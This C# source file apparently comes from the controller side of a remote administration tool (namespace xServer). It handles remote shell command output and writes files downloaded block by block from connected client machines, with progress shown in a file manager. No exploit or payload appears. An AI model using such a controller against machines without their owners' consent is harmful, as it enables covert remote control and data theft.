using System;
using System.IO;
using System.Windows.Forms;
using xServer.Core.Helper;
using xServer.Core.Packets.ClientPackets;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
    public static partial class CommandHandler
    {
        public static void HandleShellCommandResponse(Client client, ShellCommandResponse packet)
        {
            if (client.Value.FrmRs == null || string.IsNullOrEmpty(packet.Output))
                return;

            if (packet.IsError)
                client.Value.FrmRs.PrintError(packet.Output);
            else
                client.Value.FrmRs.PrintMessage(packet.Output);
        }

        public static void HandleDownloadFileResponse(Client client, DownloadFileResponse packet)
        {
            if (string.IsNullOrEmpty(packet.Filename))
                return;

            if (!Directory.Exists(client.Value.DownloadDirectory))
                Directory.CreateDirectory(client.Value.DownloadDirectory);

            string downloadPath = Path.Combine(client.Value.DownloadDirectory, packet.Filename);

            bool Continue = true;
            if (packet.CurrentBlock == 0 && File.Exists(downloadPath))
                if (
                    MessageBox.Show(string.Format("The file '{0}' already exists!\nOverwrite it?", packet.Filename),
                        "Overwrite Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
                    Continue = false;

            if (client.Value.FrmFm == null)
            {
                new Packets.ServerPackets.DownloadFileCanceled(packet.ID).Execute(client);
                MessageBox.Show("Please keep the File Manager open.\n\nWarning: Download aborted", "Download aborted",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            int index = client.Value.FrmFm.GetTransferIndex(packet.ID.ToString());
            if (index < 0)
                return;

            if (Continue)
            {
                if (!string.IsNullOrEmpty(packet.CustomMessage))
                {
                    if (client.Value.FrmFm == null) // abort download when form is closed
                        return;

                    client.Value.FrmFm.UpdateTransferStatus(index, packet.CustomMessage, 0);
                    return;
                }

                FileSplit destFile = new FileSplit(downloadPath);
                if (!destFile.AppendBlock(packet.Block, packet.CurrentBlock))
                {
                    if (client.Value.FrmFm == null)
                        return;

                    client.Value.FrmFm.UpdateTransferStatus(index, destFile.LastError, 0);
                    return;
                }

                decimal progress =
                    Math.Round((decimal)((double)(packet.CurrentBlock + 1) / (double)packet.MaxBlocks * 100.0), 2);

                if (client.Value.FrmFm == null)
                    return;

                client.Value.FrmFm.UpdateTransferStatus(index, string.Format("Downloading...({0}%)", progress), -1);

                if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
                {
                    if (client.Value.FrmFm == null)
                        return;

                    client.Value.FrmFm.UpdateTransferStatus(index, "Completed", 1);
                }
            }
            else
            {
                if (client.Value.FrmFm == null)
                    return;

                client.Value.FrmFm.UpdateTransferStatus(index, "Canceled", 0);
            }
        }
    }
}